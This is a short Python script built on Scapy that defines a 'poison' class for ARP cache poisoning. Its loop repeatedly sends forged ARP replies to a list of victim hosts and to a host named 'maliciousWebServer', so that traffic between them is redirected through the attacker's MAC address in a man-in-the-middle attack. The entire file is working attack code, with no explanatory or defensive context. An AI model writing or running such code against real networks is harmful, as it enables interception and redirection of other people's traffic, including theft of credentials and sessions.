from scapy.all import *
import threading

class poison():

    def __init__(self, interface, victim, maliciousWebServer, myMAC):
        self.interface = interface
        self.victim = victim
        self.maliciousWebServer = maliciousWebServer
        self.myMAC = myMAC

    def poison(self):
        while True:
            for vict in self.victim:
                if((vict["ip"] != self.maliciousWebServer[0]["ip"]) and (vict["mac"] != self.maliciousWebServer[0]["mac"])):
                    pkt1 = Ether(src=self.myMAC) / ARP(psrc=self.maliciousWebServer[0]["ip"], hwsrc=self.myMAC, pdst=vict["ip"], hwdst=vict["mac"]) 
                    sendp(pkt1, iface=self.interface)
                    pkt2 = Ether(src=self.myMAC) / ARP(psrc=vict["ip"], hwsrc=self.myMAC, pdst=self.maliciousWebServer[0]["ip"], hwdst=self.maliciousWebServer[0]["mac"])
                    sendp(pkt2, iface=self.interface)
            time.sleep(10)
